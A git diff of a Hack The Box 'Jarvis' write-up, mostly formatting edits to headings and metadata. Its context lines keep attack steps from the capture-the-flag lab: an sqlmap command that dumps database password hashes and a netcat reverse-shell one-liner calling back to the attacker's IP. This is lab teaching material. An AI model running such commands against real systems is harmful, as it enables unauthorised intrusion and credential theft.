@@ -2,6 +2,7 @@
 title:     "Hack The Box - Jarvis"
 tags: [linux,medium,sudo,setuid,sqli,phpmyadmin,python]
 layout: post
+categories: HackTheBox OSCP-Like
 ---
 
 ![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-jarvis/1.png)
@@ -13,7 +14,7 @@ Link : <https://www.hackthebox.eu/home/machines/profile/194>
 
 Lets Begin with our Initial Nmap Scan.
 
-## Nmap Scan Results:
+## Nmap Scan Results
 
 ```
 PORT   STATE SERVICE VERSION
@@ -93,10 +94,6 @@ And it give me some payload. It Looks like SQL Injection using UNION is there.
 ### What is SQL Injection using UNION?
 >When an application is vulnerable to SQL injection and the results of the query are returned within the application's responses, the UNION keyword can be used to retrieve data from other tables within the database.
 
-Now we try to inject the payload in the URL. And I got some kind of Hash.
-![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-jarvis/8.png)
-I tried cracking that, but doesn't worked maybe its not a hash, so lets try something with SQLMAP
-
 > sqlmap -u http://supersecurehotel.htb/room.php?cod=1 --level 5 --risk 3 --password
 
 Got ``DBadmin`` hash.<br/>
@@ -129,7 +126,7 @@ Now we need to get the Session ID of phpMyAdmin.<br/>
 
 Its working lets try to get reverse shell!
 
-## Shell as www-data:
+## Shell as www-data
 
 ``nc -e /bin/sh 10.10.14.19 1234``
 
@@ -204,7 +201,7 @@ pepper@jarvis:/var/www/Admin-Utilities$
 pepper
 ```
 
-## Privilege Escalation:
+## Privilege Escalation
 
 Started my enumeration script and found there is a SUID binary.<br/>
 ![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-jarvis/19.png)
